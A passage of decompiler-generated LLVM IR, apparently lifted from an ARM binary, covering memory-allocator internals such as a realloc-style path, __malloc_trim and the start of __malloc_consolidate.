  %v0_14af0 = load i32, i32* @sl, align 4
  %v1_14af0 = load i32, i32* %r0.global-to-local, align 4
  %v2_14af0 = add i32 %v1_14af0, %v0_14af0
  store i32 %v2_14af0, i32* %r2.global-to-local, align 4
  %v1_14af4 = add i32 %v2_14af0, 4
  %v2_14af4 = inttoptr i32 %v1_14af4 to i32*
  %v3_14af4 = load i32, i32* %v2_14af4, align 4
  %v1_14af8 = or i32 %v3_14af4, 1
  store i32 %v1_14af8, i32* %r3.global-to-local, align 4
  store i32 %v1_14af8, i32* %v2_14af4, align 4
  br label %dec_label_pc_14b34

dec_label_pc_14b04:                               ; preds = %dec_label_pc_14ad4
  %v2_14b08 = add i32 %v0_14adc, %v0_14ad4
  store i32 %v2_14b08, i32* %r0.global-to-local, align 4
  %v2_14b0c = or i32 %v1_14b04, %v0_14ad4
  store i32 %v2_14b0c, i32* %r3.global-to-local, align 4
  %v1_14b10 = or i32 %v2_14ad4, 1
  store i32 %v1_14b10, i32* %r2.global-to-local, align 4
  store i32 %v2_14b0c, i32* %v2_14adc, align 4
  %v0_14b18 = load i32, i32* %r2.global-to-local, align 4
  %v1_14b18 = load i32, i32* %r0.global-to-local, align 4
  %v2_14b18 = add i32 %v1_14b18, 4
  %v3_14b18 = inttoptr i32 %v2_14b18 to i32*
  store i32 %v0_14b18, i32* %v3_14b18, align 4
  %v0_14b1c = load i32, i32* %r0.global-to-local, align 4
  %v1_14b1c = load i32, i32* %r1.global-to-local, align 4
  %v2_14b1c = add i32 %v1_14b1c, %v0_14b1c
  store i32 %v2_14b1c, i32* %r2.global-to-local, align 4
  %v1_14b20 = add i32 %v2_14b1c, 4
  %v2_14b20 = inttoptr i32 %v1_14b20 to i32*
  %v3_14b20 = load i32, i32* %v2_14b20, align 4
  %v1_14b24 = or i32 %v3_14b20, 1
  store i32 %v1_14b24, i32* %r3.global-to-local, align 4
  store i32 %v1_14b24, i32* %v2_14b20, align 4
  %v0_14b2c = load i32, i32* %r0.global-to-local, align 4
  %v1_14b2c = add i32 %v0_14b2c, 8
  store i32 %v1_14b2c, i32* @r0, align 4
  %v0_14b30 = call i32 @free()
  store i32 %v0_14b30, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14b34

dec_label_pc_14b34:                               ; preds = %dec_label_pc_14ae4, %dec_label_pc_14b04
  %v0_14b34 = load i32, i32* @sl, align 4
  %v1_14b34 = add i32 %v0_14b34, 8
  store i32 %v1_14b34, i32* @r4, align 4
  br label %dec_label_pc_14c08

dec_label_pc_14b3c:                               ; preds = %bb29
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32* %r1.global-to-local, align 4
  %v4_14b44 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 64) to i32*), align 4
  store i32 %v4_14b44, i32* @r8, align 4
  %v2_14b48 = inttoptr i32 %v1_14958 to i32*
  %v3_14b48 = load i32, i32* %v2_14b48, align 4
  store i32 %v3_14b48, i32* @r4, align 4
  %v1_14b4c = add i32 %v4_14b44, 860
  %v2_14b4c = inttoptr i32 %v1_14b4c to i32*
  %v3_14b4c = load i32, i32* %v2_14b4c, align 4
  %v1_14b50 = add i32 %v3_14b48, 4
  %v1_14b54 = add i32 %v3_14b4c, -1
  store i32 %v1_14b54, i32* %r2.global-to-local, align 4
  %v2_14b58 = add i32 %v1_14b50, %v1_14b54
  %v1_14b5c = load i32, i32* @sb, align 4
  %v2_14b5c = add i32 %v2_14b58, %v1_14b5c
  store i32 %v2_14b5c, i32* %r3.global-to-local, align 4
  %v2_14b60 = sub i32 0, %v3_14b4c
  %v3_14b60 = and i32 %v2_14b5c, %v2_14b60
  store i32 %v3_14b60, i32* @r7, align 4
  %v2_14b64 = sub i32 %v3_14b60, %v3_14b48
  store i32 %v2_14b64, i32* @fp, align 4
  %v9_14b68 = icmp eq i32 %v1_1495c, %v2_14b64
  br i1 %v9_14b68, label %dec_label_pc_14bdc, label %dec_label_pc_14b70

dec_label_pc_14b70:                               ; preds = %dec_label_pc_14b3c
  %v2_14b70 = sub i32 %v1_14958, %v3_14b48
  store i32 %v2_14b70, i32* %r0.global-to-local, align 4
  %v2_14b74 = add i32 %v3_14b48, %v1_1495c
  store i32 %v2_14b74, i32* %r1.global-to-local, align 4
  store i32 %v3_14b60, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_14b80 = call i32 @mremap(i32 %v2_14b70, i32 %v2_14b74, i32 %v3_14b60, i32 1)
  store i32 %v4_14b80, i32* %r0.global-to-local, align 4
  %v7_14b84 = icmp eq i32 %v4_14b80, -1
  br i1 %v7_14b84, label %dec_label_pc_14bd0, label %dec_label_pc_14b8c

dec_label_pc_14b8c:                               ; preds = %dec_label_pc_14b70
  %v1_14b8c = load i32, i32* @r4, align 4
  %v2_14b8c = add i32 %v1_14b8c, %v4_14b80
  store i32 %v2_14b8c, i32* %r0.global-to-local, align 4
  %v0_14b90 = load i32, i32* @fp, align 4
  %v1_14b90 = or i32 %v0_14b90, 2
  store i32 %v1_14b90, i32* %r3.global-to-local, align 4
  %v2_14b94 = add i32 %v2_14b8c, 4
  %v3_14b94 = inttoptr i32 %v2_14b94 to i32*
  store i32 %v1_14b90, i32* %v3_14b94, align 4
  %v0_14b98 = load i32, i32* @r8, align 4
  %v1_14b98 = add i32 %v0_14b98, 868
  %v2_14b98 = inttoptr i32 %v1_14b98 to i32*
  %v3_14b98 = load i32, i32* %v2_14b98, align 4
  store i32 %v3_14b98, i32* %r3.global-to-local, align 4
  %v1_14b9c = add i32 %v0_14b98, 880
  %v2_14b9c = inttoptr i32 %v1_14b9c to i32*
  %v3_14b9c = load i32, i32* %v2_14b9c, align 4
  store i32 %v3_14b9c, i32* %r2.global-to-local, align 4
  %v0_14ba0 = load i32, i32* @r6, align 4
  %v2_14ba0 = sub i32 %v3_14b98, %v0_14ba0
  store i32 %v2_14ba0, i32* %r3.global-to-local, align 4
  %v1_14ba4 = load i32, i32* @r7, align 4
  %v2_14ba4 = add i32 %v1_14ba4, %v2_14ba0
  store i32 %v2_14ba4, i32* %r1.global-to-local, align 4
  %v1_14ba8 = add i32 %v0_14b98, 872
  %v2_14ba8 = inttoptr i32 %v1_14ba8 to i32*
  %v3_14ba8 = load i32, i32* %v2_14ba8, align 4
  store i32 %v3_14ba8, i32* %r3.global-to-local, align 4
  %v1_14bb0 = add i32 %v0_14b98, 884
  %v2_14bb0 = inttoptr i32 %v1_14bb0 to i32*
  %v3_14bb0 = load i32, i32* %v2_14bb0, align 4
  store i32 %v3_14bb0, i32* %r2.global-to-local, align 4
  %tmp42 = icmp ugt i32 %v2_14ba4, %v3_14b9c
  br i1 %tmp42, label %bb33, label %bb34

bb33:                                             ; preds = %dec_label_pc_14b8c
  store i32 %v2_14ba4, i32* %v2_14b9c, align 4
  %v0_14bb8.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_14bb8.pre = load i32, i32* @r8, align 4
  br label %bb34

bb34:                                             ; preds = %dec_label_pc_14b8c, %bb33
  %v1_14bb8 = phi i32 [ %v0_14b98, %dec_label_pc_14b8c ], [ %v1_14bb8.pre, %bb33 ]
  %v0_14bb8 = phi i32 [ %v2_14ba4, %dec_label_pc_14b8c ], [ %v0_14bb8.pre, %bb33 ]
  %v2_14bb8 = add i32 %v1_14bb8, 868
  %v3_14bb8 = inttoptr i32 %v2_14bb8 to i32*
  store i32 %v0_14bb8, i32* %v3_14bb8, align 4
  %v0_14bbc = load i32, i32* %r1.global-to-local, align 4
  %v1_14bbc = load i32, i32* %r3.global-to-local, align 4
  %v2_14bbc = add i32 %v1_14bbc, %v0_14bbc
  store i32 %v2_14bbc, i32* %r1.global-to-local, align 4
  %v1_14bc0 = load i32, i32* %r2.global-to-local, align 4
  %v0_14bc4 = load i32, i32* %r0.global-to-local, align 4
  %v1_14bc4 = add i32 %v0_14bc4, 8
  store i32 %v1_14bc4, i32* @r4, align 4
  %tmp43 = icmp ugt i32 %v2_14bbc, %v1_14bc0
  br i1 %tmp43, label %bb35, label %dec_label_pc_14c08

bb35:                                             ; preds = %bb34
  %v5_14bc8 = load i32, i32* @r8, align 4
  %v6_14bc8 = add i32 %v5_14bc8, 884
  %v7_14bc8 = inttoptr i32 %v6_14bc8 to i32*
  store i32 %v2_14bbc, i32* %v7_14bc8, align 4
  br label %dec_label_pc_14c08

dec_label_pc_14bd0:                               ; preds = %dec_label_pc_14b70
  %v0_14bd0 = load i32, i32* @sb, align 4
  %v1_14bd0 = add i32 %v0_14bd0, 4
  store i32 %v1_14bd0, i32* %r3.global-to-local, align 4
  %v0_14bd4 = load i32, i32* @r6, align 4
  %v3_14bd4 = icmp ult i32 %v0_14bd4, %v1_14bd0
  br i1 %v3_14bd4, label %dec_label_pc_14be4, label %dec_label_pc_14bd0.dec_label_pc_14bdc_crit_edge

dec_label_pc_14bd0.dec_label_pc_14bdc_crit_edge:  ; preds = %dec_label_pc_14bd0
  %v0_14bdc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_14bdc

dec_label_pc_14bdc:                               ; preds = %dec_label_pc_14bd0.dec_label_pc_14bdc_crit_edge, %dec_label_pc_14b3c
  %v0_14bdc = phi i32 [ %v0_14bdc.pre, %dec_label_pc_14bd0.dec_label_pc_14bdc_crit_edge ], [ %v0_14944, %dec_label_pc_14b3c ]
  store i32 %v0_14bdc, i32* @r4, align 4
  br label %dec_label_pc_14c08

dec_label_pc_14be4:                               ; preds = %dec_label_pc_14bd0
  %v1_14be4 = add i32 %v0_14bd0, -7
  store i32 %v1_14be4, i32* @r0, align 4
  %v0_14be8 = call i32 @malloc()
  store i32 %v0_14be8, i32* @r0, align 4
  store i32 %v0_14be8, i32* @r4, align 4
  %v2_14bec = icmp eq i32 %v0_14be8, 0
  br i1 %v2_14bec, label %dec_label_pc_14c08, label %dec_label_pc_14bf4

dec_label_pc_14bf4:                               ; preds = %dec_label_pc_14be4
  %v0_14bf4 = load i32, i32* @r6, align 4
  %v1_14bf4 = add i32 %v0_14bf4, -8
  store i32 %v1_14bf4, i32* @r2, align 4
  %v0_14bf8 = load i32, i32* @r5, align 4
  store i32 %v0_14bf8, i32* @r1, align 4
  %v0_14bfc = call i32 @memcpy()
  %v0_14c00 = load i32, i32* @r5, align 4
  store i32 %v0_14c00, i32* @r0, align 4
  %v0_14c04 = call i32 @free()
  store i32 %v0_14c04, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14c08

dec_label_pc_14c08:                               ; preds = %bb31, %bb35, %bb34, %dec_label_pc_14be4, %dec_label_pc_14bdc, %dec_label_pc_14b34, %.thread6, %dec_label_pc_149a4, %dec_label_pc_14bf4
  store i32 %v2_148f0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32* %r2.global-to-local, align 4
  %v4_14c18 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 44) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_14c18)
  br label %dec_label_pc_14c24

dec_label_pc_14c24:                               ; preds = %dec_label_pc_14924, %dec_label_pc_148cc, %dec_label_pc_148b4, %dec_label_pc_14c08
  %v0_14c24 = load i32, i32* @r4, align 4
  store i32 %v0_14c24, i32* %r0.global-to-local, align 4
  store i32 %v3_14894, i32* @r4, align 4
  store i32 %v6_14894, i32* @r5, align 4
  store i32 %v9_14894, i32* @r6, align 4
  store i32 %v12_14894, i32* @r7, align 4
  store i32 %v15_14894, i32* @r8, align 4
  store i32 %v18_14894, i32* @sb, align 4
  store i32 %v21_14894, i32* @sl, align 4
  store i32 %v24_14894, i32* @fp, align 4
  store i32 %v27_14894, i32* @lr, align 4
  ret i32 %v0_14c24

; uselistorder directives
  uselistorder i32 %v2_14bbc, { 1, 0, 2 }
  uselistorder i32 %v2_14ba4, { 1, 2, 0, 3 }
  uselistorder i32 %v4_14b80, { 1, 0, 2 }
  uselistorder i32 %v3_14b60, { 1, 0, 2, 3 }
  uselistorder i32 %v1_14b04, { 2, 1, 0 }
  uselistorder i32 %v2_14ad4, { 1, 0, 2 }
  uselistorder i32 %v0_14a68, { 1, 0 }
  uselistorder i32 %v0_14a24, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %v3_14988, { 0, 2, 1, 3 }
  uselistorder i32 %v2_14980, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 %v1_14964, { 3, 5, 0, 1, 2, 4, 6 }
  uselistorder i32 %v1_1495c, { 0, 7, 5, 1, 2, 3, 4, 6, 8, 9 }
  uselistorder i32 %v1_14958, { 2, 3, 0, 1, 4 }
  uselistorder i1 %v2_14948, { 1, 0 }
  uselistorder i32 %v0_14944, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_1491c, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 11, 7, 8, 9, 10, 21, 12, 14, 13, 20, 22, 15, 16, 17, 18, 19, 25, 24, 23, 26, 27 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_14c24, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_14c08, { 8, 3, 4, 1, 2, 5, 6, 0, 7 }
  uselistorder label %bb34, { 1, 0 }
  uselistorder label %dec_label_pc_14b34, { 1, 0 }
  uselistorder label %dec_label_pc_14ad4, { 1, 2, 0 }
  uselistorder label %.thread6, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_14a20, { 1, 2, 0 }
  uselistorder label %dec_label_pc_14a14, { 1, 0 }
  uselistorder label %dec_label_pc_14a10, { 1, 0 }
  uselistorder label %bb29, { 1, 0 }
  uselistorder label %bb27, { 1, 0 }
}

define i32 @function_14c38(i32 %arg1) local_unnamed_addr {
dec_label_pc_14c38:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_14c38 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14c38, label %.thread3, label %.thread5

.thread3:                                         ; preds = %dec_label_pc_14c38
  store i32 0, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 0)
  %v0_14c4c.pr.pr.pr = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14c4c.pr.pr.pr, label %bb, label %.thread3..thread5_crit_edge

.thread3..thread5_crit_edge:                      ; preds = %.thread3
  %v4_14c50.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread5

bb:                                               ; preds = %.thread3
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread5

.thread5:                                         ; preds = %.thread3..thread5_crit_edge, %dec_label_pc_14c38, %bb
  %v4_14c50 = phi i32 [ %v4_14c50.pre, %.thread3..thread5_crit_edge ], [ %arg1, %dec_label_pc_14c38 ], [ 0, %bb ]
  ret i32 %v4_14c50

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %.thread5, { 2, 0, 1 }
}

define i32 @__malloc_trim(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v1_14c54 = add i32 %arg2, 44
  %v2_14c54 = inttoptr i32 %v1_14c54 to i32*
  %v3_14c54 = load i32, i32* %v2_14c54, align 4
  %v12_14c58 = load i32, i32* @r7, align 4
  %v1_14c5c = add i32 %v3_14c54, 4
  %v2_14c5c = inttoptr i32 %v1_14c5c to i32*
  %v3_14c5c = load i32, i32* %v2_14c5c, align 4
  %v1_14c60 = add i32 %arg2, 860
  %v2_14c60 = inttoptr i32 %v1_14c60 to i32*
  %v3_14c60 = load i32, i32* %v2_14c60, align 4
  store i32 %v3_14c60, i32* @r4, align 4
  %v1_14c64 = and i32 %v3_14c5c, -4
  store i32 %v1_14c64, i32* @r6, align 4
  %v1_14c68 = add i32 %v1_14c64, -17
  %v2_14c6c = add i32 %v1_14c68, %v3_14c60
  store i32 %arg2, i32* @r5, align 4
  %v2_14c78 = sub i32 %v2_14c6c, %arg1
  store i32 %v3_14c60, i32* %r1.global-to-local, align 4
  %v2_14c80 = udiv i32 %v2_14c78, %v3_14c60
  %v1_14c84 = add i32 %v2_14c80, -1
  store i32 %v1_14c84, i32* %r0.global-to-local, align 4
  %v2_14c88 = mul i32 %v1_14c84, %v3_14c60
  store i32 %v2_14c88, i32* @r7, align 4
  %v2_14c8c = icmp eq i32 %v2_14c88, 0
  store i1 %v2_14c8c, i1* @cpsr_z, align 1
  %tmp8 = icmp slt i32 %v2_14c88, 1
  br i1 %tmp8, label %dec_label_pc_14cf4, label %dec_label_pc_14c94

dec_label_pc_14c94:                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_14c98 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_14c98, i32* %r0.global-to-local, align 4
  %v0_14c9c = load i32, i32* @r5, align 4
  %v1_14c9c = add i32 %v0_14c9c, 44
  %v2_14c9c = inttoptr i32 %v1_14c9c to i32*
  %v3_14c9c = load i32, i32* %v2_14c9c, align 4
  %v0_14ca0 = load i32, i32* @r6, align 4
  %v2_14ca0 = add i32 %v0_14ca0, %v3_14c9c
  %v9_14ca4 = icmp eq i32 %v1_14c98, %v2_14ca0
  store i1 %v9_14ca4, i1* @cpsr_z, align 1
  store i32 %v1_14c98, i32* @r4, align 4
  br i1 %v9_14ca4, label %dec_label_pc_14cb0, label %dec_label_pc_14cf4

dec_label_pc_14cb0:                               ; preds = %dec_label_pc_14c94
  %v0_14cb0 = load i32, i32* @r7, align 4
  %v1_14cb0 = sub i32 0, %v0_14cb0
  store i32 %v1_14cb0, i32* %r0.global-to-local, align 4
  %v1_14cb4 = call i32 @__GI_sbrk(i32 %v1_14cb0)
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_14cbc = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_14cbc, i32* %r0.global-to-local, align 4
  %v7_14cc0 = icmp eq i32 %v1_14cbc, -1
  store i1 %v7_14cc0, i1* @cpsr_z, align 1
  br i1 %v7_14cc0, label %dec_label_pc_14cf4, label %dec_label_pc_14cc8

dec_label_pc_14cc8:                               ; preds = %dec_label_pc_14cb0
  %v0_14cc8 = load i32, i32* @r4, align 4
  %v2_14cc8 = sub i32 %v0_14cc8, %v1_14cbc
  store i32 %v2_14cc8, i32* %r0.global-to-local, align 4
  %v9_14cc8 = icmp eq i32 %v0_14cc8, %v1_14cbc
  store i1 %v9_14cc8, i1* @cpsr_z, align 1
  br i1 %v9_14cc8, label %dec_label_pc_14cf4, label %dec_label_pc_14cd0

dec_label_pc_14cd0:                               ; preds = %dec_label_pc_14cc8
  %v0_14cd0 = load i32, i32* @r5, align 4
  %v1_14cd0 = add i32 %v0_14cd0, 872
  %v2_14cd0 = inttoptr i32 %v1_14cd0 to i32*
  %v3_14cd0 = load i32, i32* %v2_14cd0, align 4
  %v1_14cd4 = load i32, i32* @r6, align 4
  %v2_14cd4 = sub i32 %v1_14cd4, %v2_14cc8
  store i32 %v2_14cd4, i32* %r2.global-to-local, align 4
  %v1_14cd8 = add i32 %v0_14cd0, 44
  %v2_14cd8 = inttoptr i32 %v1_14cd8 to i32*
  %v3_14cd8 = load i32, i32* %v2_14cd8, align 4
  store i32 %v3_14cd8, i32* %r1.global-to-local, align 4
  %v2_14cdc = sub i32 %v3_14cd0, %v2_14cc8
  %v1_14ce0 = or i32 %v2_14cd4, 1
  store i32 %v1_14ce0, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v2_14cdc, i32* %v2_14cd0, align 4
  %v0_14cec = load i32, i32* %r2.global-to-local, align 4
  %v1_14cec = load i32, i32* %r1.global-to-local, align 4
  %v2_14cec = add i32 %v1_14cec, 4
  %v3_14cec = inttoptr i32 %v2_14cec to i32*
  store i32 %v0_14cec, i32* %v3_14cec, align 4
  %v1_14d00.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14cf8

dec_label_pc_14cf4:                               ; preds = %dec_label_pc_14c94, %dec_label_pc_14cc8, %dec_label_pc_14cb0, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14cf8

dec_label_pc_14cf8:                               ; preds = %dec_label_pc_14cd0, %dec_label_pc_14cf4
  %v1_14d00 = phi i32 [ %v1_14d00.pre, %dec_label_pc_14cd0 ], [ 0, %dec_label_pc_14cf4 ]
  store i32 %v12_14c58, i32* @r7, align 4
  ret i32 %v1_14d00

; uselistorder directives
  uselistorder i1 %v7_14cc0, { 1, 0 }
  uselistorder i32 %v1_14cbc, { 2, 1, 0, 3 }
  uselistorder i32 %v3_14c60, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 10, 9, 8, 0 }
  uselistorder i32 872, { 1, 0, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_14cf8, { 1, 0 }
  uselistorder label %dec_label_pc_14cf4, { 1, 2, 0, 3 }
}

define i32 @__malloc_consolidate() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_14d04 = load i32, i32* @r4, align 4
  store i32 %v3_14d04, i32* %stack_var_-36, align 4
  %v0_14d08 = load i32, i32* @r0, align 4
  %v1_14d08 = inttoptr i32 %v0_14d08 to i32*
  %v2_14d08 = load i32, i32* %v1_14d08, align 4
  store i32 %v2_14d08, i32* %r3.global-to-local, align 4
  %v2_14d0c = icmp eq i32 %v2_14d08, 0
  store i32 %v0_14d08, i32* @r4, align 4
  br i1 %v2_14d0c, label %dec_label_pc_14e44.preheader, label %dec_label_pc_14d20

dec_label_pc_14e44.preheader:                     ; preds = %entry
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_14e4c25 = add i32 %v0_14d08, 52
  store i32 %v1_14e4c25, i32* %r3.global-to-local, align 4
  %v2_14e5426 = add i32 %v0_14d08, 60
  %v3_14e5427 = inttoptr i32 %v2_14e5426 to i32*
  store i32 %v1_14e4c25, i32* %v3_14e5427, align 4
  %v0_14e5828 = load i32, i32* %r3.global-to-local, align 4
  %v2_14e5829 = add i32 %v0_14e5828, 12
  %v3_14e5830 = inttoptr i32 %v2_14e5829 to i32*
  store i32 %v0_14e5828, i32* %v3_14e5830, align 4
  br label %dec_label_pc_14e44.dec_label_pc_14e44_crit_edge

dec_label_pc_14d20:                               ; preds = %entry
  %v1_14d20 = and i32 %v2_14d08, -3
  %v3_14d24 = udiv i32 %v2_14d08, 8
  store i32 %v3_14d24, i32* %r2.global-to-local, align 4
  store i32 %v1_14d20, i32* %v1_14d08, align 4
  %v0_14d2c = load i32, i32* @r0, align 4
  %v1_14d2c = add i32 %v0_14d2c, -4
  store i32 %v1_14d2c, i32* %r3.global-to-local, align 4
  %v1_14d30 = load i32, i32* %r2.global-to-local, align 4
  %v4_14d30 = mul i32 %v1_14d30, 4
  %v5_14d30 = add i32 %v4_14d30, %v1_14d2c
  store i32 %v5_14d30, i32* %sb.global-to-local, align 4
  %v1_14d34 = add i32 %v0_14d2c, 52
  store i32 %v1_14d34, i32* %r7.global-to-local, align 4
  %v1_14d38 = add i32 %v0_14d2c, 4
  store i32 %v1_14d38, i32* %r6.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_14d40

dec_label_pc_14d40:                               ; preds = %dec_label_pc_14e3c, %dec_label_pc_14d20
  %v1_14e3410 = phi i32 [ %v1_14e34, %dec_label_pc_14e3c ], [ %v5_14d30, %dec_label_pc_14d20 ]
  %v1_14d4c = phi i32 [ %v1_14e3c, %dec_label_pc_14e3c ], [ %v1_14d38, %dec_label_pc_14d20 ]
  %v1_14d40 = inttoptr i32 %v1_14d4c to i32*
  %v2_14d40 = load i32, i32* %v1_14d40, align 4
  store i32 %v2_14d40, i32* %r1.global-to-local, align 4
  %v2_14d44 = icmp eq i32 %v2_14d40, 0
  br i1 %v2_14d44, label %dec_label_pc_14e34, label %dec_label_pc_14d4c

dec_label_pc_14d4c:                               ; preds = %dec_label_pc_14d40
  %v0_14d4c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_14d4c, i32* %v1_14d40, align 4
  %v0_14d50.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14d50

dec_label_pc_14d50:                               ; preds = %dec_label_pc_14e28, %dec_label_pc_14d4c
  %v0_14d6c = phi i32 [ %v0_14e28, %dec_label_pc_14e28 ], [ %v0_14d50.pre, %dec_label_pc_14d4c ]
  %v1_14d50 = add i32 %v0_14d6c, 4
  %v2_14d50 = inttoptr i32 %v1_14d50 to i32*
  %v3_14d50 = load i32, i32* %v2_14d50, align 4
  store i32 %v3_14d50, i32* %r3.global-to-local, align 4
  %v1_14d54 = and i32 %v3_14d50, -2
  store i32 %v1_14d54, i32* %lr.global-to-local, align 4
  %v2_14d58 = add i32 %v1_14d54, %v0_14d6c
  store i32 %v2_14d58, i32* @r0, align 4
  %v1_14d5c = urem i32 %v3_14d50, 2
  %v2_14d5c = icmp eq i32 %v1_14d5c, 0
  %v1_14d60 = add i32 %v0_14d6c, 8
  %v2_14d60 = inttoptr i32 %v1_14d60 to i32*
  %v3_14d60 = load i32, i32* %v2_14d60, align 4
  store i32 %v3_14d60, i32* %sl.global-to-local, align 4
  %v1_14d64 = add i32 %v2_14d58, 4
  %v2_14d64 = inttoptr i32 %v1_14d64 to i32*
  %v3_14d64 = load i32, i32* %v2_14d64, align 4
  store i32 %v3_14d64, i32* %r8.global-to-local, align 4
  br i1 %v2_14d5c, label %dec_label_pc_14d6c, label %dec_label_pc_14da0

dec_label_pc_14d6c:                               ; preds = %dec_label_pc_14d50
  %v1_14d6c = inttoptr i32 %v0_14d6c to i32*
  %v2_14d6c = load i32, i32* %v1_14d6c, align 4
  store i32 %v2_14d6c, i32* %r5.global-to-local, align 4
  %v2_14d70 = sub i32 %v0_14d6c, %v2_14d6c
  store i32 %v2_14d70, i32* %r3.global-to-local, align 4
  %v1_14d74 = add i32 %v2_14d70, 8
  %v2_14d74 = inttoptr i32 %v1_14d74 to i32*
  %v3_14d74 = load i32, i32* %v2_14d74, align 4
  store i32 %v3_14d74, i32* %ip.global-to-local, align 4
  %v1_14d78 = add i32 %v3_14d74, 12
  %v2_14d78 = inttoptr i32 %v1_14d78 to i32*
  %v3_14d78 = load i32, i32* %v2_14d78, align 4
  store i32 %v3_14d78, i32* %r1.global-to-local, align 4
  %v9_14d7c = icmp eq i32 %v3_14d78, %v2_14d70
  %v1_14d80 = add i32 %v2_14d70, 12
  %v2_14d80 = inttoptr i32 %v1_14d80 to i32*
  %v3_14d80 = load i32, i32* %v2_14d80, align 4
  store i32 %v3_14d80, i32* %r2.global-to-local, align 4
  br i1 %v9_14d7c, label %dec_label_pc_14d88, label %dec_label_pc_14de4

dec_label_pc_14d88:                               ; preds = %dec_label_pc_14d6c
  %v1_14d88 = add i32 %v3_14d80, 8
  %v2_14d88 = inttoptr i32 %v1_14d88 to i32*
  %v3_14d88 = load i32, i32* %v2_14d88, align 4
  store i32 %v3_14d88, i32* %r3.global-to-local, align 4
  %v9_14d8c = icmp eq i32 %v3_14d88, %v2_14d70
  br i1 %v9_14d8c, label %dec_label_pc_14d94, label %dec_label_pc_14de4

dec_label_pc_14d94:                               ; preds = %dec_label_pc_14d88
  store i32 %v3_14d74, i32* %v2_14d88, align 4
  %v0_14d98 = load i32, i32* %r2.global-to-local, align 4
  %v1_14d98 = load i32, i32* %ip.global-to-local, align 4
  %v2_14d98 = add i32 %v1_14d98, 12
  %v3_14d98 = inttoptr i32 %v2_14d98 to i32*
  store i32 %v0_14d98, i32* %v3_14d98, align 4
  %v0_14d9c = load i32, i32* %lr.global-to-local, align 4
  %v1_14d9c = load i32, i32* %r5.global-to-local, align 4
  %v2_14d9c = add i32 %v1_14d9c, %v0_14d9c
  store i32 %v2_14d9c, i32* %lr.global-to-local, align 4
  %v0_14da4.pre = load i32, i32* @r0, align 4
  %v0_14da8.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_14da0

dec_label_pc_14da0:                               ; preds = %dec_label_pc_14d50, %dec_label_pc_14d94
  %v0_14e18 = phi i32 [ %v1_14d54, %dec_label_pc_14d50 ], [ %v2_14d9c, %dec_label_pc_14d94 ]
